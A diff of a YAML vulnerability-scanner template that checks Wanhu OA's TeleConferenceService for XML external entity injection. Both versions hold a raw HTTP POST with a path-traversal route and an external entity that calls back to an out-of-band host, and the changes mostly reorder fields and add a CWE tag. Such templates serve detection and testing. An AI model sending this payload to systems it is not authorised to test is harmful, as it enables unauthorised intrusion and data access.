@@ -1,5 +1,4 @@
 id: wanhu-teleconferenceservice-xxe
-
 info:
   name: Wanhu OA TeleConferenceService Interface - XML External Entity Injection
   author: SleepingBag945
@@ -9,15 +8,33 @@ info:
   reference:
     - http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20TeleConferenceService%20XXE注入漏洞.html
     - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20TeleConferenceService%20XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cwe-id:
+      - CWE-611
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
-    verified: true
-    max-request: 1
     fofa-query: app="万户网络-ezOFFICE"
-  tags: wanhu,oa,xxe,vuln
-
+    max-request: 1
+    verified: true
+  tags: oa,vuln,wanhu,xxe
 http:
-  - raw:
+  - matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - condition: and
+        part: body
+        type: word
+        words:
+          - <response>
+          - <retcode>
+      - part: header
+        type: word
+        words:
+          - text/xml
+    matchers-condition: and
+    raw:
       - |
         POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService HTTP/1.1
         Host: {{Hostname}}
@@ -26,23 +43,3 @@ http:
         <!DOCTYPE ANY [
         <!ENTITY xxe SYSTEM "http://{{interactsh-url}}" >]>
         <value>&xxe;</value>
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "dns"
-
-      - type: word
-        part: body
-        words:
-          - "<response>"
-          - "<retcode>"
-        condition: and
-
-      - type: word
-        part: header
-        words:
-          - "text/xml"
-
